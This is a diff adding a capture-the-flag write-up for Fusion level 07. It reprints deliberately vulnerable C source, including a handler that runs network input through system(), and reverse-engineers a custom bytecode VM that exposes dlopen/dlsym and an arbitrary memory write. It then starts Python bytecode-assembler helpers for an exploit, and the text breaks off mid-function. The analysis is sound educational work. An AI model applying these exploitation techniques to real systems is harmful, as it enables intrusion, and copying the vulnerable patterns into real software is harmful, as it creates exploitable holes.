@@ -1,0 +1,1528 @@
+---
+title: Fusion level 07 - (Un)serious reverse engineering
+description: custom instruction sets, Reversing encryption algorithms, and then some dlopen() FUN!
+image: rsc/imgs/medusablue.png
+author: execius
+date: 2026-03-09
+tags: [binary exploitation, reverse engineering]
+---
+
+- the author states : "Reverse engineering level with library re-usage." in the challenge description , but the vulnerability type is stated as `stack` , I am not sure if this is purely RE or RE + stack exploit , we'll see .
+
+ - protections :
+
+| Option                             | Setting |
+| ---------------------------------- | ------- |
+| Vulnerability Type                 | Stack   |
+| Position Independent Executable    | Yes     |
+| Read only relocations              | No      |
+| Non-Executable stack               | Yes     |
+| Non-Executable heap                | Yes     |
+| Address Space Layout Randomisation | Yes     |
+| Source Fortification               | Yes     |
+
+## source code 
+as always , first we have the source code :
+```C
+#include "../common/common.c"  
+
+#include <pth.h>
+#include <openssl/rsa.h>
+
+#include "utlist.h"
+
+struct ops {
+  void (*register_cmd)(unsigned int opcode, unsigned int flags, void *(*fp)(void *));
+  void (*unregister_cmd)(unsigned int opcode);
+};
+
+int parse_pak(unsigned char *pakaddr, size_t paklen, size_t base, struct ops *ops);
+
+#define DB (572)
+
+int udp;
+
+struct pa {
+  unsigned char *buf;
+  ssize_t len;
+  struct sockaddr_in sin;
+
+  unsigned char *p;
+  ssize_t remainder;
+  
+};
+
+void free_pa(struct pa *pa)
+{
+  if(! pa) return;
+
+  if(! pa->buf) {
+    memset(pa->buf, 0, pa->len);
+    free(pa->buf);
+  }
+
+  memset(pa, 0, sizeof(struct pa));
+  free(pa);
+}
+
+typedef struct cmdtab {
+  unsigned int opcode;
+  unsigned int flags;
+  void *(* fp)(void *);
+  struct cmdtab *prev, *next;
+} cmdtab;
+
+cmdtab *cmdtab_head;
+
+void *dispatch(void *arg)
+{
+  struct pa *p = (struct pa *)(arg);
+  int *ip;
+  cmdtab *c = NULL;
+  
+  if(p->len < sizeof(int)) goto bail;
+
+  ip = (int *)(p->buf);
+
+  p->p = p->buf + 4;
+  p->remainder = p->len - 4;
+
+  DL_FOREACH(cmdtab_head, c) {
+    if(c->opcode == ip[0]) {
+      c->fp(p);
+      break;
+    }
+  }
+
+bail:
+  free_pa(p);
+  return NULL;
+}
+
+void register_cmd(unsigned int opcode, unsigned int flags, void *(*fp)(void *))
+{
+  cmdtab *c;
+
+  c = calloc(1, sizeof(cmdtab));
+  c->opcode = opcode;
+  c->flags = flags;
+  c->fp = fp;
+
+  DL_APPEND(cmdtab_head, c);
+}
+
+void unregister_cmd(unsigned int opcode)
+{
+  cmdtab *c, *tmp;
+
+  DL_FOREACH_SAFE(cmdtab_head, c, tmp) {
+    if(c->opcode == opcode) {
+      DL_DELETE(cmdtab_head, c);
+    }
+  }
+}
+
+
+struct ops regops = {
+  .register_cmd = register_cmd,
+  .unregister_cmd = unregister_cmd
+};
+
+#define PAKFILE "/opt/fusion/res/level07.pak"
+
+void load_and_parse_default_pak()
+{
+  void *m;
+  int fd;
+  struct stat statbuf;
+  int status;
+  unsigned int base;
+
+  fd = open(PAKFILE, O_RDONLY);
+  if(! fd) err(1, "Unable to open %s", PAKFILE);
+  if(fstat(fd, &statbuf) == -1) err(1, "Unable to fstat %s", PAKFILE);
+
+  m = mmap(NULL, statbuf.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
+  if(m == MAP_FAILED) err(1, "Unable to mmap %s", PAKFILE);
+
+  // printf("got %d bytes to process\n", statbuf.st_size);
+
+  status = parse_pak(m, statbuf.st_size, 0, &regops);
+
+  // printf("parse_pak result: %08x\n", status);
+
+}
+
+int download_pak_file(char *host, char *port, unsigned char *key, unsigned char **pakfile, size_t *pakfile_len)
+{
+  struct sockaddr_in sin;
+  size_t blue;
+  int ret;
+  size_t alloc;
+  int status;
+  int keyidx;
+  int keylen;
+  int i;
+  int fd;
+
+  status = -1;
+
+  keylen = strlen(key);
+  keyidx = 0;
+
+  memset(&sin, 0, sizeof(struct sockaddr_in));
+
+  sin.sin_addr.s_addr = inet_addr(host);
+  sin.sin_port = htons(atoi(port));
+  sin.sin_family = AF_INET;
+
+  *pakfile = NULL;
+  *pakfile_len = 0;
+
+  fd = socket(AF_INET, SOCK_STREAM, 0);
+  if(fd == -1) return;
+  if(pth_connect(fd, (void *)(&sin), sizeof(struct sockaddr_in)) == -1) goto closefd; 
+
+  if(pth_read(fd, &alloc, sizeof(alloc)) != sizeof(alloc)) goto closefd;
+
+  blue = 0;
+  *pakfile = calloc(alloc, 1);
+  if(*pakfile == NULL) goto closefd;
+  *pakfile_len = alloc;
+
+  while(alloc - blue) {
+    ret = pth_read(fd, (*pakfile) + blue, alloc - blue);
+
+    if(ret == -1) goto freemem;
+    if(ret == 0) goto freemem;
+
+    for(i = 0; i < ret; i++) {
+      //printf("key byte is %02x/%c\n", key[keyidx], key[keyidx]);
+      (*pakfile)[blue + i] ^= key[keyidx];
+      keyidx = (keyidx + 1) % keylen;
+    }
+
+    blue += ret;
+  }
+
+  status = 0;
+  goto closefd;
+
+freemem:
+  free(*pakfile);
+  *pakfile = NULL;
+  *pakfile_len = 0;
+  
+closefd:
+  close(fd);
+  return status;
+
+}
+
+void *load_new_pakfile(void *arg)
+{
+  struct pa *p = (struct pa *)(arg);
+  unsigned char *q;
+  unsigned char *host, *port, *key = NULL;
+  unsigned char *pakfile;
+  size_t pakfile_len;
+
+  host = p->p;
+  q = strchr(p->p, '|');
+  if(! q) return NULL;
+  *q++ = 0;
+  port = q;
+  q = strchr(q, '|');
+  if(! q) return NULL;
+  *q++;
+  key = q;
+
+  if(strlen(key) < 8) return NULL;
+
+  // printf("key is '%s'\n", key);
+
+  if(download_pak_file((char *)(host), (char *)(port), key, &pakfile, &pakfile_len) == 0) {
+    parse_pak(pakfile, pakfile_len, 0, &regops);
+    free(pakfile);
+  }
+
+  return NULL;
+}
+
+void *execute_command(void *arg)
+{
+  struct pa *p = (struct pa *)(arg);
+  if(fork() != 0) {
+    system(p->p);
+  }
+}
+
+int main(int argc, char **argv, char **envp)
+{
+  background_process(NAME, UID, GID);  
+
+  pth_init();
+
+  udp = get_udp_server_socket(PORT);
+
+  register_cmd(1347961165, 0, load_new_pakfile);
+  register_cmd(2280059729, 0, execute_command);
+
+  load_and_parse_default_pak();
+
+  while(1) {
+    struct pa *p;
+    int l;
+
+    p = calloc(sizeof(struct pa), 1);
+    p->buf = calloc(DB, 1);
+    l = sizeof(struct sockaddr_in);
+    p->len = pth_recvfrom(udp, p->buf, DB, 0, (void *)(&p->sin), &l); 
+
+    pth_spawn(PTH_ATTR_DEFAULT, dispatch, p);
+  }  
+}
+```
+## static analysis 
+- now since this is a reverse engineering challenge , I'm paying extra attention to this step as it is where the RE happens , as always ,starting with global structures ,main and branching with different execution paths , let's go !
+- the first structure we encounter is named `ops` and the code is this :
+```c
+struct ops {
+  void (*register_cmd)(unsigned int opcode, unsigned int flags, void *(*fp)(void *));
+  void (*unregister_cmd)(unsigned int opcode);
+};
+```
+- it contains two function pointers `register_cmd` and `unregister_cmd`, the functions return nothing and take `opcode`?? as argument , of type `unsigned int` , interesting , the first also takes a flags arg ,also `unsigned int` and a void-returning function pointer which idk what it does yet.
+- we also note a definition of `DB` as 572 and a `udp` variable of type `int`
+
+- we then have a definition of type `pa`  :
+```c
+struct pa {
+  unsigned char *buf;
+  ssize_t len; struct sockaddr_in sin;
+
+  unsigned char *p;
+  ssize_t remainder;
+  
+};
+```
+- in short this stores two character buffers and their respective length .  
+- high corruption chances here.(edit : no it wasn't it)
+
+- next and the final important globally declared variable is an instance of the `ops` struct :
+```c
+struct ops regops = {
+  .register_cmd = register_cmd,
+  .unregister_cmd = unregister_cmd
+};
+```
+- it just initializes its member to implementations of the `register_cmd` and `unregister_cmd` function that we'll see in a bit.
+
+- next and such as interesting structure is :
+```c
+typedef struct cmdtab {
+  unsigned int opcode;
+  unsigned int flags;
+  void *(* fp)(void *);
+  struct cmdtab *prev, *next;
+} cmdtab;
+```
+- this is obviously a member of a doubly linked list , thus we have the `next` and `prev` pointers 
+- we have three member similar to the arguments `register_cmd` takes and of the same types .
+
+- after structure definition we have the declaration of the `head` of the linked list : 
+```c
+cmdtab *cmdtab_head;
+```
+- we have no more structures , so let's checkout `main` now:
+```c
+int main(int argc, char **argv, char **envp)
+{
+  background_process(NAME, UID, GID);  
+
+  pth_init();
+
+  udp = get_udp_server_socket(PORT);
+
+  register_cmd(1347961165, 0, load_new_pakfile);
+  register_cmd(2280059729, 0, execute_command);
+
+  load_and_parse_default_pak();
+
+  while(1) {
+    struct pa *p;
+    int l;
+
+    p = calloc(sizeof(struct pa), 1);
+    p->buf = calloc(DB, 1);
+    l = sizeof(struct sockaddr_in);
+    p->len = pth_recvfrom(udp, p->buf, DB, 0, (void *)(&p->sin), &l); 
+
+    pth_spawn(PTH_ATTR_DEFAULT, dispatch, p);
+  }  
+}
+```
+- after background process which is used in all challenges and what i think is an initialization of the `pthread` library , we have `udp` variable set with the `get_udp_server_socket` , I think it is set to a `file descriptor` that enables writing to a socket after we as client connect to the challenge port.
+
+- next we have two calls to `register_cmd` function , so let's check that :
+ ```c
+void register_cmd(unsigned int opcode, unsigned int flags, void *(*fp)(void *))
+{
+  cmdtab *c;
+
+  c = calloc(1, sizeof(cmdtab));
+  c->opcode = opcode;
+  c->flags = flags;
+  c->fp = fp;
+
+  DL_APPEND(cmdtab_head, c);
+}
+ ```
+ - it declares and allocates and initialized a `cmdtab` node  and calls `DL_APPEND` which obvious appends it to the doubly linked list .
+
+- back to `main` the calls to `register_cmd` have 1347961165 and 2280059729 as first arguments , which is the `opcode` field , interesting , both calls' flags are set to 0 which i guess means nothing , and the function pointer are set to `load_new_pakfile` and `execute_command`(??lol) respectively . so let's check those :
+
+- first we have `load_new_pakfile` :
+```c
+void *load_new_pakfile(void *arg)
+{
+  struct pa *p = (struct pa *)(arg);
+  unsigned char *q;
+  unsigned char *host, *port, *key = NULL;
+  unsigned char *pakfile;
+  size_t pakfile_len;
+
+  host = p->p;
+  q = strchr(p->p, '|');
+  if(! q) return NULL;
+  *q++ = 0;
+  port = q;
+  q = strchr(q, '|');
+  if(! q) return NULL;
+  *q++;
+  key = q;
+
+  if(strlen(key) < 8) return NULL;
+
+  // printf("key is '%s'\n", key);
+
+  if(download_pak_file((char *)(host), (char *)(port), key, &pakfile, &pakfile_len) == 0) {
+    parse_pak(pakfile, pakfile_len, 0, &regops);
+    free(pakfile);
+  }
+
+  return NULL;
+}
+```
+- takes a `pa` structure as argument and parses `host` , `port` and `key` from `pa->p`such that `pa->p` contains information in the following format : 
+ ```text
+{host_ip}{'|' character}{port}{'|' character}{key} 
+ ```
+ - the key has to be longer than 8 characters or else the function return `NULL`.
+ - next we have a call to `download_pak_file` , if the call succeeds , `parse_pak` is called and the `pakfile` variable is freed ,which tells me that `download_pak_file` allocates it and sets the `pakfile_len` variable .
+ - looking at the functions :
+ 
+ - first : `download_pak_file` :
+```c
+int download_pak_file(char *host, char *port, unsigned char *key, unsigned char **pakfile, size_t *pakfile_len)
+{
+  struct sockaddr_in sin;
+  size_t blue;
+  int ret;
+  size_t alloc;
+  int status;
+  int keyidx;
+  int keylen;
+  int i;
+  int fd;
+
+  status = -1;
+
+  keylen = strlen(key);
+  keyidx = 0;
+
+  memset(&sin, 0, sizeof(struct sockaddr_in));
+
+  sin.sin_addr.s_addr = inet_addr(host);
+  sin.sin_port = htons(atoi(port));
+  sin.sin_family = AF_INET;
+
+  *pakfile = NULL;
+  *pakfile_len = 0;
+
+  fd = socket(AF_INET, SOCK_STREAM, 0);
+  if(fd == -1) return;
+  if(pth_connect(fd, (void *)(&sin), sizeof(struct sockaddr_in)) == -1) goto closefd; 
+
+  if(pth_read(fd, &alloc, sizeof(alloc)) != sizeof(alloc)) goto closefd;
+
+  blue = 0;
+  *pakfile = calloc(alloc, 1);
+  if(*pakfile == NULL) goto closefd;
+  *pakfile_len = alloc;
+
+  while(alloc - blue) {
+    ret = pth_read(fd, (*pakfile) + blue, alloc - blue);
+
+    if(ret == -1) goto freemem;
+    if(ret == 0) goto freemem;
+
+    for(i = 0; i < ret; i++) {
+      //printf("key byte is %02x/%c\n", key[keyidx], key[keyidx]);
+      (*pakfile)[blue + i] ^= key[keyidx];
+      keyidx = (keyidx + 1) % keylen;
+    }
+
+    blue += ret;
+  }
+
+  status = 0;
+  goto closefd;
+
+freemem:
+  free(*pakfile);
+  *pakfile = NULL;
+  *pakfile_len = 0;
+  
+closefd:
+  close(fd);
+  return status;
+
+}
+```
+- as you can see , the function is long , so I will highlight key aspects of it , it makes a connection to the `host`,`port` passed to it receives a length from that connection in the variable `alloc` which is the length of the `pakfile` to be received ,then it allocates `alloc` bytes in `pakfile` passed to it , it reads from the connection into the allocated `pakfile` and "decrypts" it by doing a xor operation each byte of it with the key byte corresponding to it , the key index rotates .
+- so we know that if we wanna send something to this we gotta encrypt it with the same method, since double `xor` restores original.
+
+#### parse_pak analysis
+- `parse_pak` is not implemented in the source code but is a part of `libpak.so` that is imported , so well fire up `ghidra` and do some reverse engineering !!!
+
+- after I `decompiled` it and spent some time of renaming , retyping ,defining data structures, and other silly reverse engineering tasks , i finally got a somewhat understandable code :
+```c
+int parse_pak(uchar *pakaddr,size_t paklen,size_t base,struct ops *ops)
+
+{
+  int ret;
+  size_t decrypted_len;
+  uchar *decrypted_text_for_now [3];
+  
+  ret = decrypt_pak(pakaddr,paklen,decrypted_text_for_now,&decrypted_len);
+  if (ret == 0) {
+    ret = run_pak_vm(decrypted_text_for_now[0],decrypted_len,base,ops);
+  }
+  else {
+    puts("Unable to decrypt PAK");
+    ret = -1;
+  }
+  return ret;
+}
+```
+- it `decrypts` the `pakfile` passed to it and passes it to `run_pak_vm` , so let's do the same RE for those  :
+```c
+ int decrypt_pak(uchar *packaddr,size_t packlen,uchar **decrypted_buff,size_t *decryted_buf_len)
+
+{
+  uchar keychar;
+  uchar *alloc_tmp;
+  uchar *dec_buffer_position;
+  uchar key [258];
+  uint i;
+  uchar textchar;
+  
+  *decryted_buf_len = packlen - 0x20;
+  alloc_tmp = calloc(*decryted_buf_len,1);
+  *decrypted_buff = alloc_tmp;
+  rc4_plus_setup(key,packaddr,0x20);
+  for (i = 0; i < packlen - 0x20; i = i + 1) {
+    dec_buffer_position = *decrypted_buff + i;
+    textchar = packaddr[i + 0x20];
+    keychar = rc4_plus(key);
+    *dec_buffer_position = keychar ^ textchar;
+  }
+  return 0;
+}
+
+```
+- yet another decryption mechanism , this uses the `rc4` stream cipher to and `XOR`s the characters from the stream with the `pakfile` 
+- note here that the first 32 bytes of the `pakfile` are the key `rc4` is setup with , and the rest is what's actually Decrypted .
+- let's check `rc4_plus_setup` , after some work in ghidra here's what I got :
+```c
+
+void rc4_plus_setup(uchar *key,uchar *key_seed,uint lenght)
+
+{
+  uint i;
+  uchar *key_tmp;
+  uint keylen;
+  bool leastbyte1;
+  uint random_index;
+  int j;
+  uchar keychar_tmp;
+  
+  keylen = 0x102;
+                    /* 
+                        */
+  leastbyte1 = ((uint)key & 1) != 0;
+  key_tmp = key;
+  if (leastbyte1) {
+    *key = '\0';
+    key_tmp = key + 1;
+    keylen = 0x101;
+  }
+  if (((uint)key_tmp & 2) != 0) {
+    key_tmp[0] = '\0';
+    key_tmp[1] = '\0';
+    key_tmp = key_tmp + 2;
+                    /* i think this whole top block 
+                       is aligning just
+                       key_tmp to 4 bytes  */
+    keylen = keylen - 2;
+  }
+                    /* zeroing the key 4 bytes by 4 */
+  for (i = keylen >> 2; i != 0; i = i - 1) {
+    key_tmp[0] = '\0';
+    key_tmp[1] = '\0';
+    key_tmp[2] = '\0';
+    key_tmp[3] = '\0';
+    key_tmp = key_tmp + 4;
+  }
+                    /* so it seems that the part
+                        above this comment all 
+                       it dooes is zero out the
+                        key field we give as argument */
+  if ((keylen & 2) != 0) {
+    key_tmp[0] = '\0';
+    key_tmp[1] = '\0';
+    key_tmp = key_tmp + 2;
+  }
+                    /* by now we have surely avanced by 2 
+                       we are editing a buffer of 256 bytes
+                       when dealing with key_tmp */
+  if (leastbyte1) {
+    *key_tmp = '\0';
+  }
+                    /* set the two bytes we skipped to 0 */
+  key[1] = '\0';
+  *key = key[1];
+                    /* whole top block is just memset-ing the key 
+                       buffer to 0 */
+  random_index = 0;
+  for (j = 0; j < 0x100; j = j + 1) {
+    key[j + 2] = (uchar)j;
+  }
+                    /* key = {0,0,0,1,2,..,255} */
+  for (j = 0; j < 0x300; j = j + 1) {
+    random_index = (int)(key[random_index + 2] + random_index + (uint)key_seed[(j & 0xffU) % lenght]
+                        ) % 0x100;
+                    /* this is Key Scheduling Algorithm (KSA) */
+    keychar_tmp = key[(j & 0xffU) + 2];
+    key[(j & 0xffU) + 2] = key[random_index + 2];
+    key[random_index + 2] = keychar_tmp;
+  }
+                    /* discard first 512 bytes of the stream */
+  for (j = 0; j < 0x200; j = j + 1) {
+    rc4_plus(key);
+  }
+  return;
+}
+
+
+```
+- the core of this is the *Key Scheduling Algorithm (KSA)* , which is used to generate a key by providing a seed  , it is deterministic  the key is then used with `rc4_plus` in order to get a steam cipher based on that key , the same seek will always give the same key and steam.
+- after working on `rc4_plus` as well :
+```c
+uchar rc4_plus(uchar *key)
+
+{
+  uchar i;
+  byte j;
+  
+  *key = (uchar)((*key + 1) % 0x100);
+  i = key[*key + 2];
+  key[1] = key[1] + i;
+  j = key[key[1] + 2];
+  key[key[1] + 2] = i;
+  key[*key + 2] = j;
+  return key[(byte)(key[1] + key[(byte)(j + i) + 2] ^ j) + 2];
+}
+```
+upon call this function provides the next character from the steam.
+
+#### vm analysis 
+- back to `parse_pak` , after decryption the `pakfile` is given to `run_pak_vm` , I reversed it with `ghidra` and this is the result of my silly attempt :
+```c
+
+/* WARNING: Type propagation algorithm not settling */
+
+int run_pak_vm(uchar *decrypted_pak,size_t decrypted_pak_len,size_t base,struct ops *op)
+
+{
+  int reterr;
+  size_t vmstack [64];
+  size_t resolved_symbol;
+  char *allocated_string;
+  ushort *allocated_str_length_ptr;
+  size_t *www_address;
+  int stk_index;
+  int library_handle;
+  undefined4 local_18;
+  int reamaining_lenght;
+  uchar *ip;
+  uchar opcode;
+  
+  library_handle = 0;
+  stk_index = 0;
+  local_18 = 0;
+  ip = decrypted_pak;
+  while( true ) {
+    while( true ) {
+      while( true ) {
+        while( true ) {
+          while( true ) {
+            opcode = *ip;
+                    /* opcode 0x70 : ret */
+            if (opcode == 0x70) {
+              return 0;
+            }
+            if (0x70 < opcode) break;
+                    /* if larger than 0x70
+                       goto second option
+                       second loop
+                       this probably was originally
+                       a switch and thus the funny
+                       structure */
+            if (opcode == 0x31) {
+                    /* opcode 0x31 : push base */
+              if (0x3f < stk_index) {
+                return -2;
+              }
+                    /* needx stack index less than 63 
+                       this is bound checking basically */
+              vmstack[stk_index] = base;
+                    /* push base */
+              stk_index = stk_index + 1;
+              ip = ip + 3;
+                    /* advance by three bytes ? 
+                       could be advacing by one
+                       instruction ? edit : yes confirmed . */
+              reamaining_lenght = reamaining_lenght + -3;
+            }
+            else if (opcode < 0x32) {
+              if (opcode == 0x18) {
+                ip = ip + 3;
+                    /* opcode 0x18 : nop */
+                reamaining_lenght = reamaining_lenght + -3;
+              }
+              else {
+                if (opcode != 0x23) {
+                  return -2;
+                }
+                    /* opcode 0x23 : write_lib(stack[ind-3],stack[ind-2],stack[ind-1]) */
+                if (stk_index < 3) {
+                  return -2;
+                }
+                    /* bounds check again , so we don't access below stack */
+                reterr = write_lib(vmstack[stk_index + -3],(char *)vmstack[stk_index + -2],
+                                   vmstack[stk_index + -1]);
+                if (reterr != 0) {
+                  return -2;
+                }
+                stk_index = stk_index + -3;
+                ip = ip + 3;
+                    /* advance ip */
+                reamaining_lenght = reamaining_lenght + -3;
+              }
+            }
+            else if (opcode == 0x46) {
+                    /* bound check */
+              if (stk_index < 2) {
+                return -2;
+              }
+                    /* *stack[ind-2]=stack[ind-1]-stack[ind-2] */
+              vmstack[stk_index + -2] = vmstack[stk_index + -1] - vmstack[stk_index + -2];
+              stk_index = stk_index + -2;
+              ip = ip + 3;
+                    /* advance ip  */
+              reamaining_lenght = reamaining_lenght + -3;
+            }
+            else {
+                    /* only remaining opcode in this loop is 0x4d then */
+              if (opcode != 0x4d) {
+                return -2;
+              }
+                    /* bounds check */
+              if (stk_index < 1) {
+                return -2;
+              }
+              library_handle = dlopen(vmstack[stk_index + -1],0x100);
+                    /* opcode 0x4d : dlopen(stack[ind-1],0x100) */
+              if (library_handle == 0) {
+                return -2;
+              }
+              stk_index = stk_index + -1;
+              ip = ip + 3;
+                    /* advance */
+              reamaining_lenght = reamaining_lenght + -3;
+            }
+          }
+                    /* end of first loop/switch option */
+          if (opcode != 0xb0) break;
+                    /* so this only handles opcode 0xb0 */
+          if (stk_index < 2) {
+            return -2;
+          }
+                    /* bounds check */
+          www_address = (size_t *)vmstack[stk_index + -2];
+                    /* www_address = stack[ind-2]
+                       opcode 0xb0 : *stack[ind-2]= stack[ind-1]
+                       this is a write what where of size 4 bytes */
+          *(size_t *)vmstack[stk_index + -2] = vmstack[stk_index + -1];
+          ip = ip + 3;
+          reamaining_lenght = reamaining_lenght + -3;
+                    /* advance  */
+          stk_index = stk_index + -2;
+        }
+                    /* end of second loop */
+        if (0xb0 < opcode) break;
+                    /* handling opcode 0x95 */
+        if (opcode == 0x95) {
+                    /* bounds check */
+          if (stk_index < 1) {
+            return -2;
+          }
+                    /* opcode 0x95 : unregister_cmd(stack[ind-1] */
+          (*op->unregister_cmd)(vmstack[stk_index + -1]);
+          stk_index = stk_index + -1;
+          ip = ip + 3;
+                    /* advance */
+          reamaining_lenght = reamaining_lenght + -3;
+        }
+        else {
+                    /* handling of opcode 0xaf */
+          if (opcode != 0xaf) {
+            return -2;
+          }
+                    /* bounds check */
+          if (0x3f < stk_index) {
+            return -2;
+          }
+                    /* opcode 0xaf : www_addr = ip + 3 
+                       stack[stkindex] = *(ip +3)(4 bytes read)
+                        this likely pushes an operand that
+                       is 2 bytes away from our opcode 
+                       into the stack */
+          www_address = (size_t *)(ip + 3);
+          vmstack[stk_index] = *(size_t *)(ip + 3);
+          stk_index = stk_index + 1;
+          ip = ip + 7;
+                    /* advance (also goes pas the pushed operand} */
+          reamaining_lenght = reamaining_lenght + -7;
+        }
+      }
+                    /* end of third loop */
+      if (opcode == 0xb4) break;
+                    /* so this only handles 0xea */
+      if (opcode != 0xea) {
+        return -2;
+      }
+                    /* bounds check */
+      if (0x3f < stk_index) {
+        return -2;
+      }
+      allocated_str_length_ptr = (ushort *)(ip + 1);
+      allocated_string = calloc((uint)*allocated_str_length_ptr,1);
+                    /* opcode 0xea [op1] [op2]: 
+                       in short this allows us to put 
+                       a sting in memory and get its 
+                       on the vm stack , the sting is 
+                       copied directly from out byte
+                       code , lol
+                       
+                       desc :
+                       op1 is 2 bytes ushort lenght
+                       op2 is a string of op1 lenght
+                        
+                       what this does :
+                       string = calloc(op1(lenght),1(probably was sizeof(char))
+                       memcpy(string(dst),ip+3(src),op1(len))
+                       stack[stack_index] = string */
+      memcpy(allocated_string,ip + 3,(uint)*allocated_str_length_ptr);
+      vmstack[stk_index] = (size_t)allocated_string;
+      stk_index = stk_index + 1;
+      ip = ip + *allocated_str_length_ptr + 3;
+                    /* advance */
+      reamaining_lenght = (reamaining_lenght - (uint)*allocated_str_length_ptr) + -3;
+    }
+                    /* end of fourth loop
+                       
+                       this handles opcode 0xb4 */
+    if (stk_index < 1) {
+      return -2;
+    }
+                    /* bounds check */
+    if (library_handle == 0) break;
+                    /* opcode 0xb4 : dlsym(libray_handle,stack[ind-1])
+                       the second argument is symbol name 
+                       ok */
+    resolved_symbol = dlsym(library_handle,vmstack[stk_index + -1]);
+    if (resolved_symbol == 0) {
+      return -2;
+    }
+                    /* replaces stack[ind-1](name previously)
+                       by the symbol handle returned */
+    vmstack[stk_index + -1] = resolved_symbol;
+    ip = ip + 3;
+                    /* advance */
+    reamaining_lenght = reamaining_lenght + -3;
+  }
+  return -2;
+}
+
+
+```
+- this code is super messy with the whole nested `while` loops , this is due to a `switch` statement being decompiled as nested while loops , the reason for which i don't know , maybe compiler optimization 
+- anyway , i will give you the tl;dr feel free to read the code it is somewhat more readable compared to the mess i got initially from `ghidra` .
+- this code is a virtual machine with a custom set of opcodes that do certain operations (also keep in mind the stack is this vm design grows upwards) , we have a stack index that works like a stack pointer , also an opcode pointer that works like instruction pointer .
+- using the instruction set, we can push our data into the stack , call specific functions and even write to arbitrary memory , yes you read it right , there is a write-what-when that is provided as an opcode , the operations are as follows :
+#####  opcode 0x70 :
+- ret
+#####  opcode 0x31 :
+- push base argument 
+- stackindex decreases by 1
+- rersult base in stack\[ind-1]
+##### opcode 0x18 :
+- nop
+##### opcode 0x23 :
+- write_lib(stack\[ind-3],stack\[ind-2],stack\[ind-1]) 
+- stack address decreases by 3
+##### opcode 0x46 :
+- stack\[ind-2]=stack\[ind-1]-stack\[ind-2]
+- then stack index decreases by 2 so the stack points to stack\[ind-2] previously
+##### opcode 0x4d :
+- dlopen(stack\[ind-1],0x100) 
+- stack decreses by 1
+##### opcode 0xb0 :
+- \*stack\[ind-2]= stack\[ind-1] 
+- this is a write what where of size 4 bytes 
+- stack index decreses by 2 so the stack points to stack\[ind-2] previously (the pointer we have written to )
+##### opcode 0x95 :
+- unregister_cmd(stack\[ind-1]) 
+- stack then decreses by 1
+##### opcode 0xaf :
+- stack\[stkindex] = \*(ip +3)(4 bytes read)
+- this pushes an operand that is 2 bytes away from our opcode  into the stack 
+- the stack INCREASES so our pushed arg is in stack\[ind-1] , perfect.
+##### opcode 0xea $op1 $op2:
+- in short this allows us to put  a sting in memory and get its  on the vm stack , the sting is  copied directly from out byte code (lol)
+- the stack INCREASES so our string address is in stack\[ind-1]             
+- op1 is 2 bytes ushort length
+- op2 is a string of op1 length                  
+
+    what this does :
+      string = calloc(op1(length),1);
+      memcpy(string(dst),ip+3(src),op1(len));
+	 push string address
+##### opcode 0xb4 :
+- dlsym(libray_handle,stack\[-1]) 
+- the second argument is symbol name 
+- no effect on the stack 
+- the symbol address is placed in the chunk where the name was (stack\[in-1])
+
+- a trend in these operation is that functions always clean up their arguments from the stack, which is nice.
+
+
+
+
+
+- this has been a pretty deep dive , back to main now , what remains is :
+```c
+main(){
+...
+  register_cmd(2280059729, 0, execute_command);
+
+  load_and_parse_default_pak();
+
+  while(1) {
+    struct pa *p;
+    int l;
+
+    p = calloc(sizeof(struct pa), 1);
+    p->buf = calloc(DB, 1);
+    l = sizeof(struct sockaddr_in);
+    p->len = pth_recvfrom(udp, p->buf, DB, 0, (void *)(&p->sin), &l); 
+
+    pth_spawn(PTH_ATTR_DEFAULT, dispatch, p);
+  }  
+}
+```
+- register cmd registers the function `execute_command` just like it did with `load_new_pak` , `execute_cmd` is this sweet thing (this literally executes our input , no need to say anything else):
+```c
+void *execute_command(void *arg)
+{
+  struct pa *p = (struct pa *)(arg);
+  if(fork() != 0) {
+    system(p->p);
+  }
+}
+```
+- then calls `load_and_parse_default_pak` , this last one just loads a local `pakfile` from the machine of path `/opt/fusion/res/level07.pak` , and parses it with `parse_pak` , which means this file has code that is executed by the vm we reversed earlier.
+- after that it enter a loop where it reads to a buffer of a `pa` structure and passes that structure to `dispatch` in a new thread
+- dispatch is this thingy :
+```c
+void *dispatch(void *arg)
+{
+  struct pa *p = (struct pa *)(arg);
+  int *ip;
+  cmdtab *c = NULL;
+  
+  if(p->len < sizeof(int)) goto bail;
+
+  ip = (int *)(p->buf);
+
+  p->p = p->buf + 4;
+  p->remainder = p->len - 4;
+
+  DL_FOREACH(cmdtab_head, c) {
+    if(c->opcode == ip[0]) {
+      c->fp(p);
+      break;
+    }
+  }
+
+bail:
+  free_pa(p);
+  return NULL;
+}
+```
+- it gets an opcode from the first 4 bytes of the string , set the `p` member of the `pa` structures to `buf`+4 (skips the opcode) ,and if a `cmdtab` structure that is in the linked list has that opcode , it calls the `fp` member of that structure (a function pointer) with the argument p which is the `pa` we provided .
+- if we could simply give the `opcode` of the `cmdtab` structure  and execute `execute_cmd` that calls `system` with our input , we'd be golden , but the next section shows that that is not really the case here .
+## dynamic analysis and vm code execution
+- the first thing I wanna point out is that while this challenge seems easy at first glance , just call `execute_cmd` with a reverse shell , no , it wouldn't work , since the code in the local `pakfile` that is executed by the vm before we can interact with it calls `unregister_cmd` on the `cmdtab` structure that has `execute_cmd` , so we can't use that opcode , I confirmed this by checking the head of the linked list in `gdb` :
+```gdb
+pwndbg> p *cmdtab_head
+$2 = {
+  opcode = 1347961165,
+  flags = 0,
+  fp = 0xb77acb90 <load_new_pakfile>,
+  prev = 0xb79c6008,
+  next = 0x0
+}
+```
+- as you can see , `next` pointer is NULL , and only the head node is present which allows us to call `load_new_pakfile` , so we'll have to work with that.
+- out only options is to work with `load_new_pakfile` opcode and do something with that .
+- to speed up and do this dynamic analysis thing properly , I am going to develop some functions that allow me to create byte code for the challenge's vm programatically and also encrypt and deliver `pakfile` so that they could be decrypted and executed by the challenge's vm , here are function that generate byte code :
+```python 
+#implementing vm  assember
+def vm_ret():
+    return p8(0x70)
+
+def vm_nop():
+    return p8(0x18)
+
+def vm_push_base():
+    return p8(0x31)
+
+def vm_push(val):
+    bcode =  bytearray()
+    bcode += p8(0xaf)
+    #fillers
+    bcode += 2*p8(0xff)
+    bcode += val
+
+    return bcode
+
+def vm_sub():
+    return p8(0x46)
+
+def vm_push_str_addr(stringbytes):
+    length = len(stringbytes)
+    bcode =  bytearray()
+    bcode += p8(0xea)
+    bcode += p16(length)
+    bcode += stringbytes
+    return bcode
+
+def vm_writelib(path,src,srclen):
+    bcode =  bytearray()
+    bcode += vm_push_str_addr(path)
+    bcode += vm_push_str_addr(src)
